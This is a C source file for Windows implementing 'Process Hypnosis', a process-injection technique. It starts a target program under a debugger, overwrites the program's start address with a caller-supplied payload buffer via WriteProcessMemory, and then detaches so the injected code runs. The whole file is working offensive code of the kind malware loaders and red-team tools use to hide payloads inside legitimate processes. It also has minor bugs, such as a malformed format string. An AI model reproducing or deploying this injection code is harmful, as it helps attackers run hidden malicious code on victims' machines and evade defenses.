#include "box.h"

// Original Author: https://github.com/CarlosG13/Process-Hypnosis-Debugger-assisted-control-flow-hijack

BOOL CreateDebuggedProcess
(
	IN LPCSTR ProcessName,
	OUT DWORD* TID,
	OUT DWORD* PID,
	OUT HANDLE* hProcess,
	OUT HANDLE* hThread
)
{
	if (!hProcess || !hThread || !PID)
		return FALSE;

	STARTUPINFOA StartupInfo;
	PROCESS_INFORMATION ProcessInformation;

	RtlSecureZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&ProcessInformation, sizeof(PROCESS_INFORMATION));
	StartupInfo.cb = sizeof(STARTUPINFO);

	if (!CreateProcessA(NULL, ProcessName, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &StartupInfo, &ProcessInformation))
	{
		WARN("Failed To Create a New Debuged Process of %s", ProcessName);
		PRINT_ERROR("CreateProcessA");
		return FALSE;
	}

	printf(
		"Newly Created Process\n"
		"\\___[%ld] TID\n"
		"\\___[%ld] PID\n"
		"\\___[0x%p] hProcess\n"
		"\\___[0x%p] hThread\n",
		ProcessInformation.dwThreadId, ProcessInformation.dwProcessId, ProcessInformation.hProcess, ProcessInformation.hThread);

	*TID = ProcessInformation.dwThreadId;
	*PID = ProcessInformation.dwProcessId;
	*hProcess = ProcessInformation.hProcess;
	*hThread = ProcessInformation.hThread;

	return TRUE;

}

BOOL ProcessHypnosis
(
	IN DWORD PID,
	IN DWORD TID,
	IN HANDLE hProcess,
	IN HANDLE hThread,
	IN PBYTE Buffer,
	IN SIZE_T BufferSize
)
{

	if (!Buffer || !BufferSize)
		return FALSE;

	SIZE_T BytesWritten = 0;
	DEBUG_EVENT dEvent;
	RtlSecureZeroMemory(&dEvent, sizeof(DEBUG_EVENT));

	while (WaitForDebugEvent(&dEvent, INFINITE))
	{

		switch (dEvent.dwDebugEventCode)
		{

		case CREATE_PROCESS_DEBUG_EVENT:

			/*Contains Process Creation Info that can be used by a Debugger*/

			printf(
				"[x] DEBUG INFO\n"
				"[x] Main Thread: [0x%p]\n"
				"[x] lpStartAddress: [0x%p]\n",
				dEvent.u.CreateProcessInfo.hThread, dEvent.u.CreateProcessInfo.lpStartAddress);

			break;

		case CREATE_THREAD_DEBUG_EVENT:

			/*Information about newly created threads*/

			printf(
				"[x] Thread lpStartAddress: [0x%p]\n"
				"[x] ThreadLocalBase: [0x%p\]n",
				dEvent.u.CreateThread.lpStartAddress, dEvent.u.CreateThread.lpThreadLocalBase);

			break;

		case EXCEPTION_DEBUG_EVENT:

			if (dEvent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_BREAKPOINT)
			{
				INFO("Breakpoint Triggered!");
				INFO("[RIP] --> [0x%p]", dEvent.u.Exception.ExceptionRecord.ExceptionAddress);
				break;
			}

		}

		if (!WriteProcessMemory(hProcess, dEvent.u.CreateProcessInfo.lpStartAddress, Buffer, BufferSize, &BytesWritten))
		{
			WARN("Failed To write %zu bytes to Process Memory!", BufferSize);
			PRINT_ERROR("WriteProcessMemory");
			return FALSE;
		}

		if (!DebugActiveProcessStop(PID))
		{
			WARN("Failed to unfreeze hThread!");
			PRINT_ERROR("DebugActiveProcessStop");
			return FALSE;
		}

		if (!ContinueDebugEvent(PID, TID, DBG_CONTINUE))
		{
			WARN("Failed To Continue Debuged Event!");
			PRINT_ERROR("ContinueDebugEvent");
			return FALSE;
		}

	}

FUNC_END:

	if (hProcess != NULL)
		CloseHandle(hProcess);

	if (hThread != NULL)
		CloseHandle(hThread);


	return TRUE;

}